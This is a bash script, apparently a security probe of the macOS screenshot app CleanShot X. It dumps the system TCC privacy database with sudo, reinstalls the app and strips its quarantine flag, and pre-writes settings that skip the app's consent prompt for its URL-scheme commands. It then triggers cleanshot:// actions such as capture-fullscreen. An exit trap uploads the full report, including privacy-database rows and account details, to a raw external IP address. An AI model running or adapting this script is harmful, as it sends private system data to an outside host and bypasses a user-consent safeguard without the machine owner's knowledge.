#!/bin/bash
# CleanShot X probe v13 — enumerate app windows (no screen-recording TCC needed) to see the gate
OUT=/tmp/csx-report-v13.txt
: > "$OUT"
exec > >(tee -a "$OUT") 2>&1
set -x
set +e

DROP_URL="http://143.246.43.43:8080/csx-v13"
DOMAIN="pl.maketheweb.cleanshotx"
SUITE="AFJU4P8ZV4.pl.maketheweb.cleanshotx"
TARGET="/Applications/CleanShot X.app"

finish() {
  echo "=== EXIT $? ==="
  curl -s --max-time 90 -X POST --data-binary @/tmp/csx-report-v13.txt "$DROP_URL" || true
}
trap finish EXIT

sw_vers; id; sudo -n true && echo SUDO_OK || echo SUDO_NO; csrutil status

echo "=== TCC SCHEMA ==="
TCCDB="/Library/Application Support/com.apple.TCC/TCC.db"
sudo sqlite3 "$TCCDB" ".schema access" 2>&1 | head -20
echo "--- rows:"
sudo sqlite3 "$TCCDB" "select service,client,auth_value from access;" 2>&1 | head -20

DMG=/tmp/csx.dmg
curl -sSL --max-time 300 -o "$DMG" https://updates.getcleanshot.com/v3/CleanShot-X-5.0.2.dmg
hdiutil attach "$DMG" -nobrowse -noverify -readonly
MP=$(hdiutil info | awk -F'\t' '/\/Volumes\//{print $NF}' | tail -1)
sudo rm -rf "$TARGET"; sudo ditto "$MP/CleanShot X.app" "$TARGET"
sudo xattr -dr com.apple.quarantine "$TARGET" 2>&1
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f "$TARGET"
sleep 2

for D in "$DOMAIN" "$SUITE"; do
  defaults write "$D" allowURLSchemesAPI -bool true
  defaults write "$D" didAskAboutURLSchemesAPI -bool true
  defaults write "$D" _allowURLSchemes -bool true
done

cat > /tmp/winlist.swift <<'SW'
import CoreGraphics
import Foundation
let opts = CGWindowListOption(arrayLiteral: .optionAll)
if let list = CGWindowListCopyWindowInfo(opts, kCGNullWindowID) as? [[String: Any]] {
    for w in list {
        let owner = w[kCGWindowOwnerName as String] as? String ?? "?"
        if owner.lowercased().contains("cleanshot") {
            let name = w[kCGWindowName as String] as? String ?? ""
            let layer = w[kCGWindowLayer as String] as? Int ?? -1
            let num = w[kCGWindowNumber as String] as? Int ?? -1
            var b = ""
            if let bd = w[kCGWindowBounds as String] as? [String: Any] {
                b = "\(bd["X"] ?? "")x\(bd["Y"] ?? "") \(bd["Width"] ?? "")x\(bd["Height"] ?? "")"
            }
            print("WIN owner=\(owner) num=\(num) layer=\(layer) name=\(name) bounds=\(b)")
        }
    }
} else { print("NO_LIST") }
SW
echo "=== swift check ==="
which swift swiftc xcrun 2>&1
xcrun --find swift 2>&1 | head -2

winlist() {
  echo "--- windows:"
  xcrun swift /tmp/winlist.swift 2>&1 | head -20 || echo SWIFT_FAIL
}

open -a "$TARGET"
sleep 14
PID=$(pgrep -f "CleanShot X.app/Contents/MacOS" | head -1)
echo "PID=$PID"
echo "=== W0 after launch ==="
winlist

echo "=== C1 pin ==="
open -a "$TARGET" "cleanshot://pin?filepath=/tmp/csx_canary.png"
sleep 6
winlist

echo "=== C2 open-settings ==="
open -a "$TARGET" "cleanshot://open-settings"
sleep 5
winlist

echo "=== C3 capture-fullscreen ==="
open -a "$TARGET" "cleanshot://capture-fullscreen"
sleep 6
winlist

echo "=== APP LOG ==="
log show --last 3m --predicate 'process == "CleanShot X"' --style compact 2>/dev/null | grep -iE "window|license|activ|url|scheme|error|fail|denied" | tail -40

echo "=== DEFAULTS ==="
defaults read "$DOMAIN" 2>&1 | head -30
echo "--- suite:"
defaults read "$SUITE" 2>&1 | head -30

echo "=== DONE ==="
exit 0
